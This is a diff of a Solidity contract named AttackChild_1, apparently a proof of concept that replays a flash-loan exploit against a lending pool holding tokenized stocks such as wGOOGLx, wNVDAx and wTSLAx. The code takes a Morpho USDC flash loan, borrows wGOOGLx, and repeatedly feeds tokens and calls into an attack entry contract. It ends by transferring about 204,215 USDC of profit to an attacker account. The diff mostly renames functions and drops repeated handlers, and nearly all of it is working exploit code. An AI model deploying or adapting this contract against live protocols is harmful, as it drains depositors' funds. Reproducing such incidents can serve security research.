-    function _handleFlashLoanCa24() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa25() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa26() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa27() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa28() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa29() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa30() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa31() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa32() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa33() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa34() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa35() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa36() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _handleFlashLoanCa37() internal {
-        uint256 supplyLiveAmount = 1414889025557658614;
-        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
-    }
-
-    function _approveLendingPool() public {
+    function approveLendingPool() public {
         IERC20Like(Addresses.wGOOGLx).approve(Addresses.A_3EEEB3_FAA6, type(uint256).max);
+    }
+
+    function _returnEmpty() internal pure {
+        assembly { return(0, 0) }
     }
 }
 
@@ -1086,15 +350,15 @@ contract AttackChild_1 {
 
     function execute(bytes calldata callbackPayload) external payable {
         callbackPayload;
-        _startMorphoFlash();
+        _handleAttackChildCa();
         bytes memory ret = hex"";
         assembly { return(add(ret, 32), mload(ret)) }
     }
 
-    function onMorphoFlashLoan(uint256 amount, bytes calldata callbackPayload) external payable {
+    function onMorphoFlashLoan(uint256 amount, bytes calldata arg1) external payable {
         amount;
-        callbackPayload;
-        if (!_callbackDone[MORPHO_CALLBACK]) flashCallback2();
+        arg1;
+        if (!_replayDone[REPLAY_CALLBACK_11]) flashCallback2();
         bytes memory ret = hex"";
         assembly { return(add(ret, 32), mload(ret)) }
     }
@@ -1104,13 +368,13 @@ contract AttackChild_1 {
     }
 
     function attackChildCb() external payable {
-        _startMorphoFlash();
+        _handleAttackChildCa();
         bytes memory ret = hex"";
         assembly { return(add(ret, 32), mload(ret)) }
     }
 
     function flashCallback() external payable {
-        if (!_callbackDone[MORPHO_CALLBACK]) flashCallback2();
+        if (!_replayDone[REPLAY_CALLBACK_11]) flashCallback2();
         bytes memory ret = hex"";
         assembly { return(add(ret, 32), mload(ret)) }
     }
@@ -1130,8 +394,8 @@ contract AttackChild_1 {
         }
     }
 
-    bytes32 private constant MORPHO_CALLBACK = keccak256("poc.morpho.callback");
-    mapping(bytes32 => bool) private _callbackDone;
+    bytes32 private constant REPLAY_CALLBACK_11 = keccak256("poc.replay.REPLAY_CALLBACK_11");
+    mapping(bytes32 => bool) private _replayDone;
 
     mapping(bytes32 => bool) private _profitSettlementFlag;
 
@@ -1143,19 +407,17 @@ contract AttackChild_1 {
         _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
     }
 
-    function _startMorphoFlash() internal {
-        // Exact artifact-backed Morpho flash-loan calldata; ABI re-encoding is intentionally avoided.
-        IFlashLoanTarget(Addresses.Morpho)
-            .flashLoan(
-                Addresses.USDC, 180000000000, hex"0000000000000000000000008b2af1a9885e4755d22ce4a49f7a525a33f1c9e4"
-            );
+    function _handleAttackChildCa() internal {
+        bytes memory flashLoanProof = abi.encode(Addresses.attack_path_entry);
+        IMorpho(Addresses.Morpho).flashLoan(Addresses.USDC, 180000000000, flashLoanProof);
+
         IERC20Like(Addresses.USDC).balanceOf(address(this));
-        uint256 profitTransferAmount = 204215572188;
-        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, profitTransferAmount);
+        uint256 transferActionGraphAmount = 204215572188;
+        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, transferActionGraphAmount);
     }
 
     function flashCallback2() internal {
-        _callbackDone[MORPHO_CALLBACK] = true;
+        _replayDone[REPLAY_CALLBACK_11] = true;
         flashCallback3();
         flashCallback6();
         flashCallback9();
@@ -1179,15 +441,15 @@ contract AttackChild_1 {
         }
         IERC20Like(Addresses.wGOOGLx).balanceOf(Addresses.ewGOOGLx);
         {
-            uint256 borrowedWgooglxAmount = 1414889025557658614;
+            uint256 borrowActionGraphAmount = 1414889025557658614;
             IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
-                .borrow(Addresses.wGOOGLx, borrowedWgooglxAmount, 2, uint16(0), address(this));
+                .borrow(Addresses.wGOOGLx, borrowActionGraphAmount, 2, uint16(0), address(this));
         }
         {
             uint256 wGOOGLxTransferAmount = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1199,7 +461,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_2 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_2);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1214,7 +476,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_3 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_3);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1226,7 +488,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_4 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_4);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1238,7 +500,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_5 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_5);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1250,7 +512,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_6 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_6);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
     }
@@ -1265,7 +527,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_7 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_7);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1277,7 +539,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_8 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_8);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1289,7 +551,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_9 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_9);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1304,7 +566,7 @@ contract AttackChild_1 {
     }
 
     function flashCallback12() internal {
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1316,7 +578,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_11 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_11);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1328,7 +590,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_12 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_12);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1340,7 +602,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_13 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_13);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1355,7 +617,7 @@ contract AttackChild_1 {
     }
 
     function flashCallback15() internal {
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1367,7 +629,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_15 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_15);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1379,7 +641,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_16 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_16);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1391,7 +653,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_17 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_17);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1406,7 +668,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_18 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_18);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1418,7 +680,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_19 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_19);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1430,7 +692,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_20 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_20);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1442,7 +704,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_21 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_21);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
     }
@@ -1457,7 +719,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_22 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_22);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1469,7 +731,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_23 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_23);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1481,7 +743,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_24 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_24);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1496,7 +758,7 @@ contract AttackChild_1 {
     }
 
     function flashCallback24() internal {
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1508,7 +770,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_26 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_26);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1520,7 +782,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_27 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_27);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1532,7 +794,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_28 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_28);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1547,7 +809,7 @@ contract AttackChild_1 {
     }
 
     function flashCallback27() internal {
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1559,7 +821,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_30 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_30);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1571,7 +833,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_31 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_31);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1583,7 +845,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_32 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_32);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1598,7 +860,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_33 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_33);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1610,7 +872,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_34 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_34);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1622,7 +884,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_35 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_35);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1634,7 +896,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_36 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_36);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
     }
@@ -1649,7 +911,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_37 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_37);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1661,7 +923,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_38 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_38);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1673,7 +935,7 @@ contract AttackChild_1 {
             uint256 wGOOGLxTransferAmount_39 = 1414889025557658614;
             IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_39);
         }
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1688,7 +950,7 @@ contract AttackChild_1 {
     }
 
     function flashCallback36() internal {
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
         );
         {
@@ -1705,7 +967,7 @@ contract AttackChild_1 {
             IERC20Like(Addresses.GOOGLx).transfer(Addresses.wGOOGLx, gOOGLxTransferAmount);
         }
         IERC20Like(Addresses.USDC).balanceOf(Addresses.eUSDC);
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry,
             abi.encodeWithSelector(
                 bytes4(0x8259ef5f),
@@ -1715,7 +977,7 @@ contract AttackChild_1 {
             )
         );
         IERC20Like(Addresses.wSPYx).balanceOf(Addresses.A_3B707B_7B5F);
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry,
             abi.encodeWithSelector(
                 bytes4(0x8259ef5f),
@@ -1725,7 +987,7 @@ contract AttackChild_1 {
             )
         );
         IERC20Like(Addresses.wQQQx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_44CA9E);
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry,
             abi.encodeWithSelector(
                 bytes4(0x8259ef5f),
@@ -1735,7 +997,7 @@ contract AttackChild_1 {
             )
         );
         IERC20Like(Addresses.wMSTRx).balanceOf(Addresses.A_854633_4EC0);
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry,
             abi.encodeWithSelector(
                 bytes4(0x8259ef5f),
@@ -1745,7 +1007,7 @@ contract AttackChild_1 {
             )
         );
         IERC20Like(Addresses.wNVDAx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_706D86);
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry,
             abi.encodeWithSelector(
                 bytes4(0x8259ef5f),
@@ -1755,7 +1017,7 @@ contract AttackChild_1 {
             )
         );
         IERC20Like(Addresses.wTSLAx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_E97B09);
-        _strictCall(
+        _decodedCall(
             Addresses.attack_path_entry,
             abi.encodeWithSelector(
                 bytes4(0x8259ef5f),
@@ -1770,9 +1032,9 @@ contract AttackChild_1 {
         }
     }
 
-    function _acceptSetup() public {}
+    function prepareFlashLoan() public {}
 
-    function _strictCall(address target, bytes memory data) internal {
+    function _decodedCall(address target, bytes memory data) internal {
         (bool ok,) = target.call(data);
         require(ok, "attack child dispatch failed");
     }
@@ -1845,6 +1107,14 @@ library Addresses {
 interface IContract_3EEEB3_FAA6 {
     function borrow(address, uint256, uint256, uint16, address) external;
     function supply(address, uint256, address, uint16) external;
+}
+
+interface IMorpho {
+    function flashLoan(address, uint256, bytes calldata) external;
+}
+
+interface Iattack_child {
+    function execute(bytes calldata) external;
 }
 
 interface IwGOOGLx {
